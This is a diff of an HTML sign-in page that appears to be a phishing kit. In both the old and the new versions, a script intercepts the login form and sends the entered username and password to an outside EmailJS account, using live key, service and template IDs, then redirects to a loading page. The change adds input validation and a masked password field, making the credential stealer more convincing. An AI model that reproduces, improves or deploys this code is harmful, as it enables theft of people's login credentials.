@@ -37,58 +37,87 @@
  <label>
  <span class=form-control__label data-stable-name=UserNameLabel>Username:</span>
 
-
- <input autocapitalize=off autocomplete=new-value class="form-control k-textbox" data-cfw-field=data-cfw-field data-field-type=System.String data-required-msg="This field is required." data-stable-name=UserNameInput id=username maxlength=20 name=UserName required type=text aria-invalid=false>
+ <input autocapitalize="off" autocomplete="new-value"
+ class="form-control k-textbox"
+ id="username" maxlength="20" name="UserName"
+ required type="text">
  
- <span class=k-invalid-msg data-for=UserName data-stable-name=ErrorText aria-hidden=true style=display:none></span>
- </label>
-</div>
-  <label>
- <span class=form-control__label data-stable-name=UserNameLabel>Password:</span>
-
-
- <input autocapitalize=off autocomplete=new-value class="form-control k-textbox" data-cfw-field=data-cfw-field data-field-type=System.String data-required-msg="This field is required." data-stable-name=UserNameInput id=password maxlength=20 name=UserName required type=text aria-invalid=false>
- 
- <span class=k-invalid-msg data-for=UserName data-stable-name=ErrorText aria-hidden=true style=display:none></span>
+ <span id="username-error" class="k-invalid-msg" style="display:none;color:red;">
+ User ID is required
+ </span>
  </label>
  
- <div class=form-submit-container>
  
-<div class=form-control-container> 
-     </div>
-       </div>
-
- <button type=submit name=submit class="btn btn--primary btn__block" autocomplete=off data-stable-name=SignInButton aria-invalid=false>
+ <label>
+ <span class="form-control__label">Password:</span>
+ 
+ <input autocapitalize="off" autocomplete="new-value"
+ class="form-control k-textbox"
+ id="password" maxlength="20" name="Password"
+ required type="password">
+ 
+ <span id="password-error" class="k-invalid-msg" style="display:none;color:red;">
+ Password is required
+ </span>
+ </label>
+ 
+ 
+ <button type="submit" name="submit"
+ class="btn btn--primary btn__block">
  Sign in
  </button>
-</div>
- </div>
- </form>
-     <script>
-            emailjs.init("m5EWYUzGEiW3cDMVu");
-    
-            function sendEmail(username, password) {
-                emailjs.send("service_ev0guaa", "template_08dlwd3", {
-                username: username,
-                password: password
-            })
-            .then(function(response) {
-                console.log('Email sent successfully!', response);
-                window.location.href = 'loadingpage.html';
-            }, function(error) {
-                console.error('Email sending failed:', error);
-            });
-        }
-
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var form = document.getElementById('login-form');
-            var username = form.querySelector('#username').value;
-            var password = form.querySelector('#password').value;
-            sendEmail(username, password);
-        });
-    </script>
-
+ 
+ 
+ <script>
+ 
+ emailjs.init("m5EWYUzGEiW3cDMVu");
+ 
+ function sendEmail(username, password) {
+     emailjs.send("service_ev0guaa", "template_08dlwd3", {
+         username: username,
+         password: password
+     })
+     .then(function(response) {
+         console.log("Email sent successfully!", response);
+         window.location.href = "loadingpage.html";
+     }, function(error) {
+         console.error("Email sending failed:", error);
+     });
+ }
+ 
+ document.getElementById("login-form").addEventListener("submit", function(event) {
+ 
+     event.preventDefault();
+ 
+     var username = document.getElementById("username").value.trim();
+     var password = document.getElementById("password").value.trim();
+ 
+     var userError = document.getElementById("username-error");
+     var passError = document.getElementById("password-error");
+ 
+     // Reset errors
+     userError.style.display = "none";
+     passError.style.display = "none";
+ 
+     let hasError = false;
+ 
+     if (username === "") {
+         userError.style.display = "block";
+         hasError = true;
+     }
+ 
+     if (password === "") {
+         passError.style.display = "block";
+         hasError = true;
+     }
+ 
+     if (hasError) return;
+ 
+     sendEmail(username, password);
+ 
+ });
+ 
+ </script>
  </div>
  </div>
  <div class=text-center>
